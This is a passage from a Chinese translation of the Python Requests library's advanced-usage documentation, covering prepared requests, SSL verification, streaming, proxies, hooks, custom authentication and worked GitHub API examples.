<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</div><div class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</div><div class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/0.13.1'</span>&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><hr>
<p>当你从API调用或Session调用得到一个<a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response" target="_blank" rel="external">Response</a>对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</div><div class="line"></div><div class="line">s = Session()</div><div class="line">req = Request(<span class="string">'GET'</span>, url,</div><div class="line">    data=data,</div><div class="line">    headers=header</div><div class="line">)</div><div class="line">prepped = req.prepare()</div><div class="line"></div><div class="line"><span class="comment"># do something with prepped.body</span></div><div class="line"><span class="comment"># do something with prepped.headers</span></div><div class="line"></div><div class="line">resp = s.send(prepped,</div><div class="line">    stream=stream,</div><div class="line">    verify=verify,</div><div class="line">    proxies=proxies,</div><div class="line">    cert=cert,</div><div class="line">    timeout=timeout</div><div class="line">)</div><div class="line"></div><div class="line">print(resp.status_code)</div></pre></td></tr></table></figure>
<p>因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests.<em> 或 Session.</em>的其他参数来发送它</p>
<p>但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用<em>Session.prepare_request()</em>来替换 <em>Request.prepare()</em>，比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</div><div class="line"></div><div class="line">s = Session()</div><div class="line">req = Request(<span class="string">'GET'</span>,  url,</div><div class="line">    data=data</div><div class="line">    headers=headers</div><div class="line">)</div><div class="line"></div><div class="line">prepped = s.prepare_request(req)</div><div class="line"></div><div class="line"><span class="comment"># do something with prepped.body</span></div><div class="line"><span class="comment"># do something with prepped.headers</span></div><div class="line"></div><div class="line">resp = s.send(prepped,</div><div class="line">    stream=stream,</div><div class="line">    verify=verify,</div><div class="line">    proxies=proxies,</div><div class="line">    cert=cert,</div><div class="line">    timeout=timeout</div><div class="line">)</div><div class="line"></div><div class="line">print(resp.status_code)</div></pre></td></tr></table></figure>
<hr>
<h2 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h2><hr>
<p>Requests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">True</span>)</div><div class="line">requests.exceptions.SSLError: hostname <span class="string">'kennethreitz.com'</span> doesn<span class="string">'t match either of '</span>*.herokuapp.com<span class="string">', '</span>herokuapp.com<span class="string">'</span></div></pre></td></tr></table></figure>
<p>在该域名上我没有设置SSL，所以失败了。但Github设置了SSL:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p>对于私有证书，你也可以传递一个<em>CA_BUNDLE</em>文件的路径给 <strong>verify</strong> 。你也可以设置 <em>REQUEST_CA_BUNDLE</em> 环境变量。</p>
<p>如果你将<strong>verify</strong>设置为<strong>False</strong>，Requests也能<strong>忽略</strong>对SSL证书的验证。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">False</span>)</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p><strong>默认</strong>情况下， <strong>verify</strong> 是设置为<strong>True</strong>的。选项 verify 仅应用于主机证书。</p>
<p>你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=(<span class="string">'/path/server.crt'</span>, <span class="string">'/path/key'</span>))</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<p>如果你指定了一个错误路径或一个无效的证书:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=<span class="string">'/wrong_path/server.pem'</span>)</div><div class="line">SSLError: [Errno <span class="number">336265225</span>] _ssl.c:<span class="number">347</span>: error:<span class="number">140</span>B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib</div></pre></td></tr></table></figure>
<hr>
<h2 id="响应体内容工作流"><a href="#响应体内容工作流" class="headerlink" title="响应体内容工作流"></a>响应体内容工作流</h2><hr>
<p>默认情况下，当你进行网络请求后，响应体会<strong>立即</strong>被下载。你可以通过 <strong>stream</strong> 参数覆盖这个行为，<strong>推迟</strong>下载响应体直到访问 <strong>Response.content</strong> 属性:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tarball_url = <span class="string">'https://github.com/kennethreitz/requests/tarball/master'</span></div><div class="line">r = requests.get(tarball_url, stream=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<p>此时仅有响应头被下载下来了，<strong>连接保持打开状态</strong>，因此允许我们根据条件获取内容:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; TOO_LONG:</div><div class="line">    content = r.content</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>你可以进一步使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_content" target="_blank" rel="external">Response.iter_content</a> 和 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">Response.iter_lines</a> 方法来控制工作流，或者以 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.raw" target="_blank" rel="external">Response.raw</a> 从底层urllib3的 urllib3.HTTPResponse &lt;urllib3.response.HTTPResponse 读取。</p>
<p>如果当你请求时设置<strong>stream</strong>为<strong>True</strong>，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了<strong>Response.close</strong>，这样会使连接变得低效率。如果当你设置 <strong>stream = True</strong> 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用<a href="http://docs.python.org/2/library/contextlib.html#contextlib.closing" target="_blank" rel="external"><strong><em>contextlib.closing</em></strong></a>,比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</div><div class="line"></div><div class="line"><span class="keyword">with</span> closing(requests.get(<span class="string">'http://httpbin.org/get'</span>, stream=<span class="keyword">True</span>)) <span class="keyword">as</span> r:</div><div class="line">    <span class="comment"># Do things with the response here.</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="保持活动状态（持久连接）"><a href="#保持活动状态（持久连接）" class="headerlink" title="保持活动状态（持久连接）"></a>保持活动状态（持久连接）</h2><hr>
<p>好消息 - 归功于urllib3，<strong>同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！</strong></p>
<blockquote>
<p><strong>注意</strong>：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 <strong>stream</strong> 设置为 <strong>False</strong> 或读取 <strong>Response</strong> 对象的 <strong>content</strong> 属性。</p>
</blockquote>
<hr>
<h2 id="流式上传"><a href="#流式上传" class="headerlink" title="流式上传"></a>流式上传</h2><hr>
<p>Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'massive-body'</span>) <span class="keyword">as</span> f:</div><div class="line">    requests.post(<span class="string">'http://some.url/streamed'</span>, data=f)</div></pre></td></tr></table></figure>
<hr>
<h2 id="块编码请求"><a href="#块编码请求" class="headerlink" title="块编码请求"></a>块编码请求</h2><hr>
<p>对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">yield</span> <span class="string">'hi'</span></div><div class="line">    <span class="keyword">yield</span> <span class="string">'there'</span></div><div class="line"></div><div class="line">requests.post(<span class="string">'http://some.url/chunked'</span>, data=gen())</div></pre></td></tr></table></figure>
<hr>
<h2 id="POST-多个编码-Multipart-Encoded-文件"><a href="#POST-多个编码-Multipart-Encoded-文件" class="headerlink" title="POST 多个编码(Multipart-Encoded)文件"></a>POST 多个编码(Multipart-Encoded)文件</h2><hr>
<p>你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”file”</span> <span class="attr">name</span>=<span class="string">”images”</span> <span class="attr">multiple</span>=<span class="string">”true”</span> <span class="attr">required</span>=<span class="string">”true”/</span>&gt;</span></div></pre></td></tr></table></figure>
<p>达到这个目的，仅仅只需要设置文件到一个包含(<em>form_field_name</em>, <em>file_info</em>)的元组的<strong>列表</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>multiple_files = [(<span class="string">'images'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'foo.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>)),</div><div class="line">                      (<span class="string">'images'</span>, (<span class="string">'bar.png'</span>, open(<span class="string">'bar.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>))]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=multiple_files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">'files'</span>: &#123;<span class="string">'images'</span>: <span class="string">'data:image/png;base64,iVBORw ....'</span>&#125;</div><div class="line">  <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a'</span>,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="事件挂钩"><a href="#事件挂钩" class="headerlink" title="事件挂钩"></a>事件挂钩</h2><hr>
<p>Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。</p>
<p>可用的钩子:</p>
<p><em>response:</em></p>
<p>  从一个请求产生的响应</p>
<p>你可以通过传递一个 <em>{hook_name: callback_function}</em> 字典给 hooks 请求参数 为每个请求分配一个钩子函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hooks=dict(response=print_url)</div></pre></td></tr></table></figure>
<p><em>callback_function</em> 会接受一个数据块作为它的第一个参数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_url</span><span class="params">(r)</span>:</span></div><div class="line">    print(r.url)</div></pre></td></tr></table></figure>
<p>若执行你的回调函数期间发生错误，系统会给出一个警告。</p>
<p>若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。</p>
<p>我们来在运行期间打印一些请求方法的参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://httpbin.org'</span>, hooks=dict(response=print_url))</div><div class="line">http://httpbin.org</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<hr>
<h2 id="自定义身份验证"><a href="#自定义身份验证" class="headerlink" title="自定义身份验证"></a>自定义身份验证</h2><hr>
<p>Requests允许你使用自己指定的身份验证机制。</p>
<p>任何传递给请求方法的 <strong><em>auth</em></strong> 参数的可调用对象，在请求发出之前都有机会修改请求。</p>
<p>自定义的身份验证机制是作为 <em>requests.auth.AuthBase</em> 的子类来实现的，也非常容易定义。</p>
<p>Requests在 <em>requests.auth</em> 中提供了两种常见的的身份验证方案： <em>HTTPBasicAuth</em> 和 <em>HTTPDigestAuth</em> 。</p>
<p>假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> AuthBase</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PizzaAuth</span><span class="params">(AuthBase)</span>:</span></div><div class="line">    <span class="string">"""Attaches HTTP Pizza Authentication to the given Request object."""</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username)</span>:</span></div><div class="line">        <span class="comment"># setup any auth-related data here</span></div><div class="line">        self.username = username</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, r)</span>:</span></div><div class="line">        <span class="comment"># modify and return the request</span></div><div class="line">        r.headers[<span class="string">'X-Pizza'</span>] = self.username</div><div class="line">        <span class="keyword">return</span> r</div></pre></td></tr></table></figure>
<p>然后就可以使用我们的<strong><em>PizzaAuth</em></strong>来进行网络请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://pizzabin.org/admin'</span>, auth=PizzaAuth(<span class="string">'kenneth'</span>))</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div></pre></td></tr></table></figure>
<hr>
<h2 id="流式请求"><a href="#流式请求" class="headerlink" title="流式请求"></a>流式请求</h2><hr>
<p>使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">requests.Response.iter_lines()</a> 你可以很方便地对流式API（例如 <a href="https://dev.twittercom/docs/streaming-api" target="_blank" rel="external">Twitter的流式API</a> ）进行迭代。简单地设置 stream 为 True 便可以使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="external">iter_lines()</a> 对相应进行迭代:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">r = requests.get(<span class="string">'http://httpbin.org/stream/20'</span>, stream=<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</div><div class="line"></div><div class="line">    <span class="comment"># filter out keep-alive new lines</span></div><div class="line">    <span class="keyword">if</span> line:</div><div class="line">        print(json.loads(line))</div></pre></td></tr></table></figure>
<hr>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><hr>
<p>如果需要使用代理，你可以通过为任意请求方法提供 <strong><em>proxies</em></strong> 参数来配置单个请求:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">proxies = &#123;</div><div class="line">  <span class="string">"http"</span>: <span class="string">"http://10.10.1.10:3128"</span>,</div><div class="line">  <span class="string">"https"</span>: <span class="string">"http://10.10.1.10:1080"</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line">requests.get(<span class="string">"http://example.org"</span>, proxies=proxies)</div></pre></td></tr></table></figure>
<p>你也可以通过环境变量 <em>HTTP_PROXY</em> 和 <em>HTTPS_PROXY</em> 来配置代理。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">export</span> HTTP_PROXY=<span class="string">"http://10.10.1.10:3128"</span></div><div class="line">$ <span class="built_in">export</span> HTTPS_PROXY=<span class="string">"http://10.10.1.10:1080"</span></div><div class="line">$ python</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">"http://example.org"</span>)</div></pre></td></tr></table></figure>
<p>若你的代理需要使用<strong>HTTP Basic Auth</strong>，可以使用 <strong><em><a href="http://user:password@host/" target="_blank" rel="external">http://user:password@host/</a> 语法</em></strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">proxies = &#123;</div><div class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="合规性"><a href="#合规性" class="headerlink" title="合规性"></a>合规性</h2><hr>
<p>Requests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。</p>
<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p>当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。</p>
<p>只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。</p>
<p>在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。<strong>(可结合上一篇安装使用快速上手中的 <em>响应内容</em> 学习)</strong></p>
<hr>
<h2 id="HTTP请求类型-附加例子"><a href="#HTTP请求类型-附加例子" class="headerlink" title="HTTP请求类型(附加例子)"></a>HTTP请求类型(附加例子)</h2><hr>
<p>Requests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了<strong>详细示例</strong>。</p>
<p>我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad'</span>)</div></pre></td></tr></table></figure>
<p>我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> (r.status_code == requests.codes.ok):</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> r.headers[<span class="string">'content-type'</span>]</div><div class="line">...</div><div class="line">application/json; charset=utf<span class="number">-8</span></div></pre></td></tr></table></figure>
<p>可见，GitHub返回了JSON数据，非常好，这样就可以使用 <strong>r.json</strong> 方法把这个返回的数据解析成Python对象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>commit_data = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data.keys()</div><div class="line">[<span class="string">u'committer'</span>, <span class="string">u'author'</span>, <span class="string">u'url'</span>, <span class="string">u'tree'</span>, <span class="string">u'sha'</span>, <span class="string">u'parents'</span>, <span class="string">u'message'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'committer'</span>]</div><div class="line">&#123;<span class="string">u'date'</span>: <span class="string">u'2012-05-10T11:10:50-07:00'</span>, <span class="string">u'email'</span>: <span class="string">u'me@kennethreitz.com'</span>, <span class="string">u'name'</span>: <span class="string">u'Kenneth Reitz'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> commit_data[<span class="string">u'message'</span>]</div><div class="line">makin<span class="string">' history</span></div></pre></td></tr></table></figure>
<p>到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(r.url)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs.status_code</div><div class="line"><span class="number">500</span></div></pre></td></tr></table></figure>
<p>额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>verbs = requests.options(<span class="string">'http://a-good-website.com/api/cats'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> verbs.headers[<span class="string">'allow'</span>]</div><div class="line">GET,HEAD,POST,OPTIONS</div></pre></td></tr></table></figure>
<p>转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。</p>
<p>本篇文档是回应<em>Issue #482</em>而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'https://api.github.com/repos/kennethreitz/requests/issues/482'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>issue = json.loads(r.text)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'title'</span>]</div><div class="line">Feature any http verb <span class="keyword">in</span> docs</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> issue[<span class="string">u'comments'</span>]</div><div class="line"><span class="number">3</span></div></pre></td></tr></table></figure>
<p>Cool，有3个评论。我们来看一下最后一个评论。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(r.url + <span class="string">u'/comments'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>comments = r.json()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">0</span>].keys()</div><div class="line">[<span class="string">u'body'</span>, <span class="string">u'url'</span>, <span class="string">u'created_at'</span>, <span class="string">u'updated_at'</span>, <span class="string">u'user'</span>, <span class="string">u'id'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'body'</span>]</div><div class="line">Probably <span class="keyword">in</span> the <span class="string">"advanced"</span> section</div></pre></td></tr></table></figure>
<p>嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> comments[<span class="number">2</span>][<span class="string">u'user'</span>][<span class="string">u'login'</span>]</div><div class="line">kennethreitz</div></pre></td></tr></table></figure>
<p>好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>body = json.dumps(&#123;<span class="string">u"body"</span>: <span class="string">u"Sounds great! I'll get right on it!"</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">u"https://api.github.com/repos/kennethreitz/requests/issues/482/comments"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url=url, data=body)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">404</span></div></pre></td></tr></table></figure>
